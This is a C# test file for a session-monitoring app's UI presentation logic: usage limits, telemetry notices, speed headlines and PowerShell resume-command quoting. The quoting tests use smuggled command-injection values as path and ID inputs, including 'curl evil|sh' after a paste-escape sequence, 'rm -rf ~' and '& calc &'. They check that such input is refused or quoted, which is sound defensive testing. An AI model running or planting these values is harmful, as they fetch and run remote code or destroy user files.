        check(SessionListModel.MaxViewport == 312 && longList.ContentHeight > SessionListModel.MaxViewport && cut <= SessionListModel.MaxViewport
              && Enumerable.Range(0, 12).Select(i => i * 45.0).Any(top => cut - top >= 12 && top + 44 - cut >= 6), "viewport snaps inside a row");
        check(make([beta]).Viewport(false) == 44, "short lists are not snapped");

        // Context: Codex percentage from the logged window, Claude absolute only.
        var codexContext = command with { Context = new TokenContextUsage(158_204, 258_400, at(-45), null) };
        var nearlyFull = codexContext with { Context = codexContext.Context! with { UsedTokens = 235_100 } };
        var claudeContext = question with { Context = new TokenContextUsage(182_331, null, at(-120), at(-300)) };
        var codexSlot = Context(codexContext, now);
        var claudeSlot = Context(claudeContext, now);
        check(codexSlot?.Text == "컨텍스트 61% 사용" && codexSlot?.Short == "61%" && codexSlot?.Spoken == "컨텍스트 61퍼센트 사용"
              && codexSlot?.Warning == false && Context(nearlyFull, now)?.Warning == true
              && claudeSlot?.Text == "컨텍스트 182k" && claudeSlot?.Short == "182k" && claudeSlot?.Fraction == null
              && claudeSlot?.Help.Contains("압축 완료 기록 5분 전") == true && Context(command, now) == null, "context slots never infer a window");
        var longAgo = claudeContext with { Context = claudeContext.Context! with { CompactedAt = at(-1_900) } };
        check(claudeSlot?.Compacted == "압축 5분 전" && Context(longAgo, now)?.Compacted == null && codexSlot?.Compacted == null,
              "a compaction shows as a fact for 30 minutes");

        // Codex usage limit: newest reset window, highest value inside it, always with its record age.
        var limited = command with { RateLimit = new TokenRateLimit(28, 10_080, at(5 * day + 11 * 3_600 + 30), at(-720)) };
        var lower = limited with { RateLimit = limited.RateLimit! with { UsedPercent = 21, RecordedAt = at(-60) } };
        var replayed = limited with { RateLimit = new TokenRateLimit(95, 10_080, at(-day), at(-5)) };
        var claudeLimit = question with { RateLimit = new TokenRateLimit(99, 300, at(10 * day), now) };
        var usage = UsageLimit([limited, lower, replayed, claudeLimit], now);
        check(usage?.UsedPercent == 28 && usage?.RecordedAt == at(-60) && usage?.Title == "Codex 주간 한도" && usage?.Value(now) == "28% 사용"
              && usage?.Detail(now) == "5일 11시간 후 초기화 · 1분 전 기록 기준", "usage limit is replay-proof and never Claude");
        // Each window length keeps its own newest reset: an older session's weekly record never hides a newer 5-hour one.
        var weeklyOld = command with { RateLimit = new TokenRateLimit(70, 10_080, at(3 * day), at(-1_800)) };
        var fiveHourNew = command with { RateLimit = new TokenRateLimit(99, 300, at(4 * 3_600), at(-60)) };
        check(UsageLimit([weeklyOld, fiveHourNew], now) is { UsedPercent: 99, WindowMinutes: 300 }
              && UsageLimit([weeklyOld, fiveHourNew with { RateLimit = fiveHourNew.RateLimit! with { ResetsAt = at(-60) } }], now)?.UsedPercent == 70,
              "a near-full 5-hour window is hidden by another session's weekly window, or a reset one outranks a live one");
        var expired = new UsageLimitSummary(64, 300, at(-10), at(-7_000));
        check(expired.Value(now) == "—" && expired.Detail(now) == "초기화됨 · 다음 Codex 기록 대기" && expired.IsOld(now)
              && UsageLimit([question], now) == null && WindowLabel(300) == "5시간" && WindowLabel(2_880) == "2일"
              && Countdown(at(42 * 60), now) == "42분", "expired windows, labels and countdowns");
        check(!(usage?.Help(now).Contains("예상") ?? true) && !(usage?.Detail(now).Contains("소진") ?? true) && usage?.Help(now).Contains("Claude") == false,
              "no forecast in limit copy, and no claim that Claude limits are missing");
        check(usage?.Details(now).SequenceEqual(["5일 11시간 후 초기화 · 1분 전 기록", "5일 11시간 후 초기화"]) == true && usage?.PercentText == "28"
              && expired.Details(now).SequenceEqual(["초기화됨 · 다음 Codex 기록 대기"]), "limit row variants keep the countdown whole");
        // Old Codex logs carry no reset time: different weeks cannot be told apart, so only the newest record counts.
        var undatedOld = command with { RateLimit = new TokenRateLimit(97, 10_080, null, at(-3 * day)) };
        var undatedNew = command with { RateLimit = new TokenRateLimit(12, 10_080, null, at(-600)) };
        var undated = UsageLimit([undatedOld, undatedNew], now);
        check(undated?.UsedPercent == 12 && undated?.RecordedAt == at(-600) && undated?.ResetsAt == null
              && undated?.Detail(now) == "10분 전 기록 기준" && undated?.IsShown(now) == true, "without reset times the newest record wins, not the highest");
        var staleUndated = new UsageLimitSummary(40, 300, null, at(-6 * 3_600));
        check(staleUndated.Expired(now) && staleUndated.Value(now) == "—" && staleUndated.IsShown(now)
              && !new UsageLimitSummary(40, 300, null, at(-2 * day)).IsShown(now), "an undated record expires one window after it was written");
        // A reset window says "초기화됨" for one day, then the card goes away.
        check(expired.IsShown(now) && !new UsageLimitSummary(64, 300, at(-day - 1), at(-2 * day)).IsShown(now) && usage?.IsShown(now) == true,
              "expired windows hide after a day");

        // Claude limits from the status line bridge: the Codex row's rules, the higher live window, the other one in help.
        ClaudeLimitWindow claudeWindow(double percent, double resetsIn, double received = -60) => new(percent, at(resetsIn), at(received));
        var bothLive = new ClaudeUsageLimits(claudeWindow(42, 2 * 3_600 + 13 * 60 + 30), claudeWindow(31, 3 * day + 4 * 3_600 + 30));
        var claudeSummary = ClaudeUsageLimit(bothLive, now);
        check(claudeSummary?.Title == "Claude 5시간 한도" && claudeSummary?.Value(now) == "42% 사용" && claudeSummary?.Source == TokenSource.Claude
              && claudeSummary?.Details(now).SequenceEqual(["2시간 13분 후 초기화 · 1분 전 기록", "2시간 13분 후 초기화"]) == true
              && claudeSummary?.Help(now).EndsWith("\n주간 한도 31% 사용 · 3일 4시간 후 초기화", StringComparison.Ordinal) == true
              && claudeSummary?.Spoken(now) == "42퍼센트 사용, 2시간 13분 후 초기화, 1분 전 기록 기준, 주간 한도 31퍼센트 사용, 3일 4시간 후 초기화",
              "Claude limit row: higher live window, Codex row wording, the other window in help and VoiceOver");
        check(claudeSummary?.ShortTitle == "Claude · 5시간" && claudeSummary?.OtherSummary(now) is { WindowMinutes: 10_080, UsedPercent: 31 } claudeWeekly
              && claudeWeekly.ShortTitle == "Claude · 주간" && claudeWeekly.RecordedAt == claudeSummary.RecordedAt && claudeWeekly.Other == null
              && claudeWeekly.Details(now)[^1] == "3일 4시간 후 초기화",
              "both Claude windows get their own row, titled provider · window");
        var weeklyHigher = ClaudeUsageLimit(new ClaudeUsageLimits(claudeWindow(30, 600), claudeWindow(30, 2 * day)), now);
        var fiveHourReset = ClaudeUsageLimit(new ClaudeUsageLimits(claudeWindow(97, -60), claudeWindow(55, 2 * day)), now);
        check(weeklyHigher?.Title == "Claude 주간 한도" && fiveHourReset?.Title == "Claude 주간 한도" && fiveHourReset?.UsedPercent == 55
              && fiveHourReset?.Other == null && fiveHourReset?.Help(now).Contains('\n') == false,
              "a tie goes to the longer window; a reset window never outranks a live one");
        var allReset = ClaudeUsageLimit(new ClaudeUsageLimits(claudeWindow(77, -1_200, received: -9_000), claudeWindow(58, -600, received: -9_000)), now);
        check(allReset?.Expired(now) == true && allReset?.Value(now) == "—" && allReset?.Title == "Claude 주간 한도"
              && allReset?.Details(now).SequenceEqual(["초기화됨 · 다음 Claude 기록 대기"]) == true && allReset?.IsShown(now) == true
              && ClaudeUsageLimit(new ClaudeUsageLimits(claudeWindow(77, -day - 1)), now)?.IsShown(now) == false
              && ClaudeUsageLimit(new ClaudeUsageLimits(), now) == null,
              "reset Claude windows read like Codex's: a dash for a day, then gone");
        check(claudeSummary?.IsOld(now) == false
              && ClaudeUsageLimit(new ClaudeUsageLimits(SevenDay: claudeWindow(31, day, received: -900)), now)?.IsOld(now) == true,
              "a Claude limit received over 10 minutes ago reads weaker");
        // The Claude desktop app's usage history: the last sample only, no reset time (none is shown), reset one window after it.
        var desktopAt = DateTimeOffset.FromUnixTimeSeconds(1_790_000_000);
        ClaudeUsageLimits? desktop(int version, double recorded) => ClaudeUsage.DecodeDesktopHistory(Encoding.UTF8.GetBytes(
            $$$"""{"version":{{{version}}},"samples":[{"t":1789000000000,"org":"x","u":{"fh":90,"sd":90}},{"t":{{{desktopAt.AddSeconds(recorded).ToUnixTimeMilliseconds()}}},"org":"x","u":{"fh":17,"sd":5}}]}"""));
        var desktopLive = desktop(2, -720);
        var desktopSummary = desktopLive is null ? null : ClaudeUsageLimit(desktopLive, desktopAt);
        var desktopOld = desktop(2, -6 * 3_600) is { } stale ? ClaudeUsageLimit(stale, desktopAt) : null;
        check(desktop(1, -720) == null && desktopLive?.FiveHour == new ClaudeLimitWindow(17, null, desktopAt.AddSeconds(-720))
              && desktopSummary?.Value(desktopAt) == "17% 사용" && desktopSummary?.Details(desktopAt).SequenceEqual(["12분 전 기록"]) == true
              && desktopSummary?.Other == null && desktopOld?.Title == "Claude 주간 한도" && desktopOld?.UsedPercent == 5,
              "Claude desktop usage: last sample only, no invented reset time, a 5-hour value gone after five hours");
        // Receipts merge per window (newer wins, a missing window is kept) and persist as numbers and times only.
        var newer = new ClaudeUsageLimits(claudeWindow(44, 7_000, received: -5));
        var merged = ClaudeUsage.Merged(ClaudeUsage.Merged(bothLive, newer), new ClaudeUsageLimits(claudeWindow(10, 7_000, received: -500)));
        check(merged.FiveHour?.UsedPercent == 44 && merged.SevenDay == bothLive.SevenDay, "newer receipts win per window");
        var folder = Directory.CreateTempSubdirectory("tokencat-presentation-checks-");
        try
        {
            var file = Path.Combine(folder.FullName, "settings.json");
            var store = new SettingsStore(file);
            LiveMonitor.SaveClaudeLimits(store, merged);
            var stored = Json.Parse(File.ReadAllBytes(file))?.Field(ClaudeUsageLimits.DefaultsKey)?.Field("fiveHour");
            check(LiveMonitor.LoadClaudeLimits(store) == merged
                  && stored?.EnumerateObject().Select(property => property.Name).ToHashSet().SetEquals(["usedPercent", "resetsAt", "receivedAt"]) == true,
                  "Claude limits persist as numbers and times only and survive a restart");
            LiveMonitor.SaveClaudeLimits(store, new ClaudeUsageLimits());
            check(store.Get<ClaudeUsageLimits>(ClaudeUsageLimits.DefaultsKey) == null && LiveMonitor.LoadClaudeLimits(store).IsEmpty,
                  "empty Claude limits clear the stored value");
        }
        finally { folder.Delete(true); }

        // Effort, last turn and help ages.
        check(EffortLabel(command with { Effort = "XHigh" }) == "xhigh" && EffortLabel(command) == null, "effort is raw lowercase");
        var partial = reading("claude:f", state: A.Complete) with { LastOutputTokens = 7_493 };
        var finished = partial with { LastTurnDurationSeconds = 252 };
        check(LastTurnSummary(finished) == "마지막 완료 턴 출력 7,493 tok · 소요 4:12" && LastTurnSummary(partial) == "마지막 출력 기록 7,493 tok"
              && LastTurnSummary(finished)?.Contains("/s") == false, "turn output and duration are never divided");
        check(HelpAge(at(-45), now) == "1분 이내" && HelpAge(at(-200), now) == "3분 전" && HelpAge(null, now) == "기록 없음", "help ages are minute-granular");
        check(RecordAge(at(-3), now) == "방금" && RecordAge(at(-9.9), now) == "방금" && RecordAge(at(-10), now) == "10초 전"
              && RecordAge(at(-47), now) == "40초 전" && RecordAge(at(-200), now) == "3분 전" && RecordAge(at(3), now) == "방금",
              "record ages: 방금, 10 s steps, then minutes");

        // Footer telemetry notice by collector state, never by matching status text.
        var port = Notice(TelemetryCollectorState.BusyOtherApp, null, none);
        var conflict = Notice(TelemetryCollectorState.Waiting, "실측 연결: Codex otel 키가 중복되거나 여러 줄 형식이어서 변경하지 않았습니다.",
                              only(TokenSource.Claude), failure: new TelemetrySetupFailure.Conflict());
        var failed = Notice(TelemetryCollectorState.Waiting, "설정 저장 중 일부 파일이 변경됐습니다.", none, failure: new TelemetrySetupFailure.WriteFailed(false));
        var restart = Notice(TelemetryCollectorState.Receiving, null, only(TokenSource.Claude, TokenSource.Codex));
        var otherTokenCat = Notice(TelemetryCollectorState.BusyTokenCat, null, none);
        var broken = Notice(TelemetryCollectorState.Failed, null, only(TokenSource.Claude));
        var stopped = Notice(TelemetryCollectorState.Stopped, null, none, status: "실측 꺼짐 · 실행 중인 TokenCat 수집기 없음");
        var expiredNotice = Notice(TelemetryCollectorState.Waiting, null, only(TokenSource.Claude), expired: only(TokenSource.Codex));
        check(otherTokenCat?.Kind == TelemetryNoticeKind.Busy && otherTokenCat?.Text == "실측 꺼짐 · 다른 TokenCat" && port?.Kind == TelemetryNoticeKind.PortBusy
              && broken?.Kind == TelemetryNoticeKind.Collector && broken?.Text == "실측 꺼짐 · 수집기 오류"
              && broken?.Help.StartsWith("실측 꺼짐 · 수집기를 시작하지 못함", StringComparison.Ordinal) == true
              && stopped?.Kind == TelemetryNoticeKind.Off && stopped?.Help.StartsWith("실측 꺼짐 · 실행 중인 TokenCat 수집기 없음", StringComparison.Ordinal) == true
              && new[] { otherTokenCat, port, broken, stopped }.All(notice => notice?.CollectorDown == true) && conflict?.CollectorDown == false,
              "collector states keep their cause");
        check(expiredNotice?.Kind == TelemetryNoticeKind.Expired && expiredNotice?.Text == "실측 미수신 · 확인 필요" && expiredNotice?.IsProblem == true
              && expiredNotice?.Help.StartsWith("Codex: 이 버전에서 실측을 받지 못했습니다", StringComparison.Ordinal) == true,
              "a day without a receipt asks for a check");
        check(port?.Text == "실측 꺼짐 · 포트 사용 중" && conflict?.Text == "실측 꺼짐 · 설정 충돌"
              && failed?.Kind == TelemetryNoticeKind.Failed && restart?.Text == "Codex·Claude Code 재시작 후 속도 표시" && restart?.IsProblem == false
              && restart?.Help.StartsWith("Codex·Claude Code를 새로 실행하면", StringComparison.Ordinal) == true, "telemetry notice causes");
        check(new[] { TelemetryCollectorState.Receiving, TelemetryCollectorState.Waiting, TelemetryCollectorState.Starting }
                  .All(collector => Notice(collector, null, none) == null)
              && new[] { port, conflict, failed, otherTokenCat, broken, expiredNotice }.All(notice => (notice?.Text.Count(ch => ch != ' ') ?? 0) <= 15),
              "no notice while healthy; copy stays short");
        // The footer's one item, by priority.
        check(Footer(true, 20, 20, port) == new FooterStatus(FooterStatusKind.Loading, "준비 중")
              && Footer(false, 12, 5, port) == new FooterStatus(FooterStatusKind.AiDelay, "AI 수집 지연 12초")
              && Footer(false, 3, 4, port) == new FooterStatus(FooterStatusKind.SystemDelay, "시스템 수집 지연 4초")
              && Footer(false, 0, 0, port) == new FooterStatus(FooterStatusKind.Notice, "실측 꺼짐 · 포트 사용 중")
              && Footer(false, 0, 0, restart).Text == "Codex·Claude Code 재시작 후 속도 표시" && Footer(false, 0, 0, null) == new FooterStatus(FooterStatusKind.Live, "실시간"),
              "footer priority: AI delay, system delay, notice, live");
        var conflictFailure = new TelemetrySetupFailure.Conflict();
        check(OnboardingOutcome.Make(port, null, null, TelemetryCollectorState.BusyOtherApp) == new OnboardingOutcome.CollectorDown("실측 꺼짐 · 포트 사용 중")
              && OnboardingOutcome.Make(conflict, "실측 연결: 이유", conflictFailure, TelemetryCollectorState.Waiting) == new OnboardingOutcome.Skipped("이유")
              && OnboardingOutcome.Make(failed, "이유", new TelemetrySetupFailure.WriteFailed(false), TelemetryCollectorState.Waiting) == new OnboardingOutcome.Failed("이유")
              && OnboardingOutcome.Make(null, null, null, TelemetryCollectorState.Starting) == new OnboardingOutcome.Preparing()
              && OnboardingOutcome.Make(null, null, null, TelemetryCollectorState.Receiving) == new OnboardingOutcome.Added(false)
              && OnboardingOutcome.Make(null, null, null, TelemetryCollectorState.Waiting, bridged: true) == new OnboardingOutcome.Added(true)
              && OnboardingOutcome.Make(conflict, "이유", conflictFailure, TelemetryCollectorState.Waiting, bridged: true) == new OnboardingOutcome.Skipped("이유"),
              "first-run outcome says only what happened");
        check(OnboardingOutcome.Make(null, null, null, TelemetryCollectorState.Receiving, optedOut: true)
              == new OnboardingOutcome.Skipped("실측 연결을 해제한 상태입니다 · 설정 › 실측에서 다시 연결"),
              "after a disconnect the card does not claim the settings were added, and points to Settings › Telemetry");
        var restartSlot = Speed(question, now, restartNeeded: true);
        check(restartSlot.Value == "—" && restartSlot.Help == "실측 연결됨 · Claude Code를 새로 실행하면 속도가 표시됩니다", "restart-needed speed help");
        check(TelemetryReceipt(new Dictionary<TokenSource, DateTimeOffset> { [TokenSource.Codex] = at(-130) }, now) == "실측 수신: Codex 2분 전 · Claude Code 기록 없음"
              && TelemetryReceipt(new Dictionary<TokenSource, DateTimeOffset> { [TokenSource.Claude] = at(-30) }, now)
                 == "실측 수신: Codex 기록 없음 · Claude Code 1분 이내", "telemetry receipt per provider");

        // Row actions copy or reveal; the log path comes from the reading id.
        var home = Path.Combine(Path.GetTempPath(), "example");
        var logPath = Path.Combine(home, ".claude", "projects", "C--work-TokenCat", "S1.jsonl");
        var located = claudeParent with { Id = "claude:.claude/projects/C--work-TokenCat/S1.jsonl", ProjectPath = @"C:\work\TokenCat" };
        var actions = RowActions(located, home);
        check(actions.Select(action => action.Title).SequenceEqual(["세션 ID 복사", "재개 명령 복사", "프로젝트 폴더 탐색기에서 보기", "기록 파일 탐색기에서 보기"])
              && actions[2].Reveal == @"C:\work\TokenCat" && actions[3].Reveal == logPath
              && actions.Select(action => action.IsReveal).SequenceEqual([false, false, true, true]) && LogFilePath(located, home) == logPath
              && RowActions(claudeChild, home).Select(action => action.Title).SequenceEqual(["세션 ID 복사", "에이전트 ID 복사"])
              && RowActions(telemetry, home).Select(action => action.Title).SequenceEqual(["세션 ID 복사"]), "row actions: copies, then reveals");
        check(LogFilePath(located with { Id = "opencode:.local/share/opencode/opencode.db#ses_1" }, home) == Path.Combine(home, ".local", "share", "opencode", "opencode.db")
              && LogFilePath(located with { Id = "amp:.local/share/amp/threads/T-1.json" }, home) == Path.Combine(home, ".local", "share", "amp", "threads", "T-1.json"),
              "row actions: a database row or a JSON snapshot log had no Show Log File");
        // Resume command (decision 7), PowerShell: single-quoted folder, hidden for subagents or without an ID or folder.
        var quoted = located with { ProjectPath = @"C:\work\it's here" };
        var codexRoot = codexParent with { ProjectPath = "C:/work/TokenCat" };
        var odd = located with { SessionID = "S 1;x" };
        var relative = located with { ProjectPath = @"work\TokenCat" };
        var smartQuote = located with { ProjectPath = "C:\\work\\x\u2019; calc; \u2018" };
        check(ResumeCommand(located) == @"cd -LiteralPath 'C:\work\TokenCat'; claude --resume S1"
              && ResumeCommand(quoted) == @"cd -LiteralPath 'C:\work\it''s here'; claude --resume S1"
              && ResumeCommand(codexRoot) == "cd -LiteralPath 'C:/work/TokenCat'; codex resume R1"
              && ResumeCommand(odd) == @"cd -LiteralPath 'C:\work\TokenCat'; claude --resume 'S 1;x'"
              && ResumeCommand(smartQuote) == "cd -LiteralPath 'C:\\work\\x\u2019\u2019; calc; \u2018\u2018'; claude --resume S1"
              && ResumeCommand(claudeChild) == null && ResumeCommand(codexParent) == null
              && ResumeCommand(relative) == null && ResumeCommand(telemetry) == null,
              "resume command quoting and hiding");
        var cmdEscape = located with { ProjectPath = @"C:\work\x & calc & rem" };
        var pasteKeys = located with { ProjectPath = "C:\\work\\x\u001b[201~\u0015curl evil|sh\r" };
        var controlID = located with { SessionID = "S1\nrm -rf ~" };
        check(ResumeCommand(cmdEscape) == null && ResumeCommand(pasteKeys) == null && ResumeCommand(controlID) == null,
              "resume command offered for a path or ID with cmd metacharacters or control characters (cmd paste, paste injection)");
        // Inline detail (S-6): metadata only, 16 + 15 per line + 0.5.
        var detailed = command with { Model = "gpt-6.1-sol", Effort = "high", LastOutputTokens = 7_493, LastTurnDurationSeconds = 252 };
        var details = DetailItems(detailed, S.Tool);
        check(details.Select(item => item.Label).SequenceEqual(["세션 ID", "모델", "도구", "마지막 완료 턴", "기록 시점"])
              && details.Select(item => item.Value).SequenceEqual(["C", "gpt-6.1-sol · high", "명령 실행 · exec", "7,493 tok · 4:12", "Codex는 응답 완료 시 기록"])
              && details[0].Copy == "C" && details[1].Copy == null && DetailHeight(detailed, S.Tool) == 16 + 15 * 5 + 0.5
              && DetailItems(claudeChild, S.Working).Select(item => item.Label).SequenceEqual(["세션 ID", "에이전트", "기록 시점"])
              && DetailItems(claudeChild, S.Working).Last().Value == "Claude Code는 메시지 완료 시 기록",
              "inline detail lines and height");
        // The detail's action line (#7): resume command, then File Explorer on the project folder, else the log file; 6 + 20 more.
        var detailActions = DetailActions(located, home);
        var logOnly = DetailActions(located with { ProjectPath = null }, home);
        check(detailActions.Select(action => action.Title).SequenceEqual(["재개 명령 복사", "탐색기에서 보기"])
              && detailActions[0].Copy == ResumeCommand(located) && detailActions[1].Reveal == @"C:\work\TokenCat"
              && logOnly.Select(action => action.Reveal).SequenceEqual([logPath]) && DetailActions(detailed, home).Count == 0
              && DetailHeight(located, S.Working) == 16 + 15 * DetailItems(located, S.Working).Count + 0.5 + 26,
              "the inline detail offers the resume command and File Explorer, and grows by the action line");

        // Wall-clock buckets: the newest starts at floor(now / 5) * 5, future records clamp, old records drop.
        var flowReading = reading("codex:flow", TokenSource.Codex) with
        {
            RecentOutputs = [new(seconds(1_000_000.5), 10), new(seconds(999_999.9), 20), new(seconds(1_000_007), 40),
                             new(seconds(1_000_009), 80), new(seconds(999_705), 160), new(seconds(999_700), 320)],
        };
        var claudeFlow = reading("claude:flow") with { RecentOutputs = [new(seconds(999_990), 5)] };
        var telemetryFlow = reading("telemetry:x") with { RecentOutputs = [new(now, 1_000)] };
        var flow = FlowSeries.Make([flowReading, claudeFlow, telemetryFlow], now);
        check(flow.Newest == seconds(1_000_000) && flow.Hero.Count == 60, "newest bucket is wall-clock aligned");
        check(flow.Hero[59] == 50 && flow.Hero[58] == 20 && flow.Hero[0] == 160 && flow.Hero[57] == 5 && flow.Total == 235,
              "records land in aligned buckets; >5 s future and out-of-window records drop");
        check(flow.Fresh[59] && flow.Fresh[58] && !flow.Fresh[57], "fresh marks buckets holding a record from the last 5 s");
        check(flow.ByProvider.GetValueOrDefault(TokenSource.Codex) == 230 && flow.ByProvider.GetValueOrDefault(TokenSource.Claude) == 5
              && flow.Last?.Tokens == 40 && flow.Last?.At == seconds(1_000_007), "provider totals and last record");
        check(flow.ByProvider.GetValueOrDefault(TokenSource.Codex) == 230 && FlowSeries.Make([telemetryFlow], now).Total == 0, "telemetry contributes nothing");
        var shifted = FlowSeries.Make([flowReading], seconds(1_000_004.9));
        var next = FlowSeries.Make([flowReading], seconds(1_000_005));
        check(shifted.Newest == flow.Newest && shifted.Hero[58] == 20 && shifted.Hero[0] == 160 && next.Hero[57] == 20 && next.Hero[58] == 10,
              "buckets stay put within an interval and shift on the boundary");
        check(FlowMath.NiceMax(200) == 200 && FlowMath.NiceMax(201) == 300 && FlowMath.NiceMax(786) == 800 && FlowMath.NiceMax(1_001) == 1_500
              && FlowMath.NiceMax(5_000) == 5_000 && FlowMath.NiceMax(6_100) == 8_000 && FlowMath.NiceMax(8_100) == 10_000 && FlowMath.NiceMax(0) == 1,
              "nice scale rounds to {1, 1.5, 2, 3, 4, 5, 6, 8} × 10ⁿ");
        // Swift's stride(from: 1, through: 100_000, by: 7.3) steps by multiplication.
        var fills = Enumerable.Range(0, (int)((100_000 - 1) / 7.3) + 1).Select(i => 1 + i * 7.3).Select(value => value / FlowMath.NiceMax(value));
        check(fills.All(fill => fill >= 2.0 / 3 - 1e-9 && fill <= 1), "the tallest bar fills at least 2/3 of the plot");

        // Honest speed.
        var unknown = Speed(claudeParent, now);
        check(unknown.Value == "—" && !unknown.Known, "unknown speed is a dash");
        var previous = reading("claude:prev") with
        {
            Model = "claude-opus-5-5",
            SpeedMeasurement = new TokenSpeedMeasurement(new TelemetryReading { Provider = TokenSource.Claude, At = at(-30) })
                with { Model = "claude-haiku", OutputTokens = 441, RequestDurationMs = 10_000 },
        };
        var previousSlot = Speed(previous, now);
        check(previousSlot.Prefix == "이전" && previousSlot.Value == "44.1" && !previousSlot.Recent
              && previousSlot.Help == "이전 실측 모델 claude-haiku · 측정 1분 이내", "previous-model measurement is labelled, minute-granular");
        var currentSlot = Speed(previous with { Model = "claude-haiku" }, now);
        check(currentSlot.Prefix == null && currentSlot.Recent && currentSlot.Kind == "요청 tok/s", "current-model measurement");

        // "지금 속도": the newest fresh measurement of one visible live session; never a sum or an average.
        TokenReading timed(string id, TokenSource source, string project, string model, string? measuredModel = null, double ago = 0,
                           double? interval = null, bool live = true)
        {
            var value = new TokenSpeedMeasurement(new TelemetryReading { Provider = source, At = at(ago) }) with { Model = measuredModel ?? model };
            value = interval is { } ms ? value with { ServerTokenIntervalMs = ms } : value with { OutputTokens = 441, RequestDurationMs = 10_000 };
            return reading(id, source, session: id.ToUpperInvariant(), project: project, active: live, state: live ? A.Working : A.Complete, last: -2)
                with { Model = model, SpeedMeasurement = value };
        }
        SpeedHeadline? headline(IReadOnlyList<TokenReading> readings, IReadOnlySet<TokenSource>? waitingRestart = null) =>
            Headline(make(readings), now, waitingRestart ?? none);
        var speedAlpha = timed("claude:alpha", TokenSource.Claude, "Alpha", "m1", ago: -30);
        var speedBeta = timed("codex:beta", TokenSource.Codex, "Beta", "g1", ago: -10, interval: 20);
        var pair = headline([speedAlpha, speedBeta]);
        check(pair?.Value == "50.0" && pair?.Kind == "생성 tok/s" && pair?.Label == "Beta" && pair?.Spoken == "생성 속도 초당 50.0 토큰, Beta"
              && pair?.Help.StartsWith("Beta · Codex g1 · 측정 1분 이내\n서버 실측 토큰 간 시간 20.000 ms", StringComparison.Ordinal) == true
              && pair?.Help.EndsWith("세션끼리 합치거나 평균내지 않습니다", StringComparison.Ordinal) == true,
              "the newest fresh measurement wins, with its kind and session; 44.1 and 50.0 are never summed or averaged");
        var titledPair = headline([speedAlpha, speedBeta with { Title = "Fix login redirect" }]);
        check(titledPair?.Label == "Fix login redirect" && titledPair?.Spoken == "생성 속도 초당 50.0 토큰, Fix login redirect"
              && titledPair?.Help.StartsWith("Fix login redirect · Beta · Codex g1 · 측정", StringComparison.Ordinal) == true,
              "a titled session names the speed headline by its title, its project kept in help");
        var switched = timed("codex:beta", TokenSource.Codex, "Beta", "g1", measuredModel: "g0", ago: -5, interval: 20);
        check(headline([speedAlpha, switched])?.Value == "44.1" && headline([speedAlpha, switched])?.Kind == "요청 tok/s",
              "a measurement from the session's previous model is left out");
        var restartWaiting = headline([speedAlpha, speedBeta], only(TokenSource.Codex, TokenSource.Claude));
        check(headline([speedAlpha, speedBeta], only(TokenSource.Codex))?.Label == "Alpha"
              && restartWaiting?.Value == "—" && restartWaiting?.Known == false
              && restartWaiting?.Help == "실측 연결됨 · Codex·Claude Code를 새로 실행하면 속도가 표시됩니다",
              "clients waiting for a restart are left out, like the row speed");
        var staleAlpha = timed("claude:alpha", TokenSource.Claude, "Alpha", "m1", ago: -130);
        var stalePair = headline([staleAlpha, timed("codex:beta", TokenSource.Codex, "Beta", "g1", ago: -121, interval: 20)], only(TokenSource.Codex));
        check(stalePair?.Value == "—" && stalePair?.Spoken == "속도 실측 없음"
              && stalePair?.Help == "진행 중인 세션의 최근 2분 실측 없음 · 로그 시각으로 추정하지 않습니다\nCodex를 새로 실행하면 속도가 표시됩니다",
              "running sessions without a measurement under 2 minutes show a dash, with why in help");
        var previousOnly = headline([switched]);
        check(previousOnly?.Value == "—" && previousOnly?.Help == "최근 실측은 이전 모델(g0) 기준이라 지금 속도로 쓰지 않습니다",
              "a fresh measurement left out for its previous model is named as such, not as a missing one");
        var quiet = timed("claude:quiet", TokenSource.Claude, "Quiet", "m1", ago: -3, live: false);
        var unmatched = timed("telemetry:claude:x", TokenSource.Claude, "요청 실측", "m1", ago: -3, live: false);
        check(headline([quiet, unmatched]) == null && headline([]) == null, "nothing running hides the speed, even beside a fresh unmatched measurement");
        var logWait = timed("claude:wait", TokenSource.Claude, "Wait", "m1", ago: -300) with { Active = false, ActivityState = A.Stale };
        var asking = timed("codex:ask", TokenSource.Codex, "Ask", "g1", ago: -300) with { ActivityState = A.Input };
        var freshWait = logWait with { SpeedMeasurement = logWait.SpeedMeasurement! with { At = at(-20) } };
        check(headline([logWait, asking]) == null && headline([freshWait, asking])?.Value == "44.1",
              "sessions only waiting for a log or the person show no placeholder, but a fresh measurement of theirs still shows");
        var helper = timed("claude:alpha/sub", TokenSource.Claude, "Alpha", "m1", ago: -4)
            with { SessionID = "CLAUDE:ALPHA", IsSubagent = true, AgentID = "a1111111e1", AgentRole = "Explore" };
        var child = headline([speedAlpha, helper]);
        check(child?.Value == "44.1" && child?.Help.StartsWith("Alpha · 하위 Explore · Claude Code m1", StringComparison.Ordinal) == true,
              "a visible live subagent's own measurement counts and is named");
        // The widget's "평균 속도": every fresh rate on its session's current model, and its clients, fastest first.
        string? average(IReadOnlyList<TokenReading> readings, IReadOnlySet<TokenSource>? waitingRestart = null) =>
            Average(make(readings), now, waitingRestart ?? none) is { } speed
                ? speed.Rate.ToString("F3", System.Globalization.CultureInfo.InvariantCulture) + " " + string.Join(",", speed.Sources.Select(source => source.Id))
                : null;
        var gamma = timed("codex:gamma", TokenSource.Codex, "Gamma", "g1", ago: -40, interval: 10);
        List<IReadOnlyList<TokenReading>> cases = [[speedAlpha, speedBeta, gamma], [gamma], [speedAlpha, switched], [staleAlpha, speedBeta], [speedBeta], [helper]];
        check(cases.Select(readings => average(readings)).SequenceEqual(["64.700 codex,claude", "100.000 codex", "44.100 claude", "50.000 codex", "50.000 codex",
                                                                         "44.100 claude"])
              && average([speedAlpha, speedBeta], only(TokenSource.Codex)) == "44.100 claude" && average([quiet, unmatched]) == null && average([staleAlpha]) == null
              && CurrentSpeed(make([speedAlpha, speedBeta, gamma]), now, none)?.Rate == 50,
              "the average speed is every fresh rate on the session's current model, its clients fastest first, never one waiting for a restart: "
              + string.Join(" / ", cases.Select(readings => average(readings) ?? "null")));

        // English: plurals, word order, spoken text and composed titles.
        With(AppLanguage.En, () =>
        {
            check(header(urgent).Spoken == "1 session needs input · 2 working" && header(plans).Spoken == "2 plans awaiting approval · 1 working"
                  && header(retryOnly).Spoken == "1 session retrying · Retry 2/10 · in 4s"
                  && header(retryOnly, spoken: true).Spoken == "1 session retrying · Retry 2/10 · in 4 seconds"
                  && header(noticeCounts, spoken: true).Spoken == "1 session waiting for log · no record for 3 minutes"
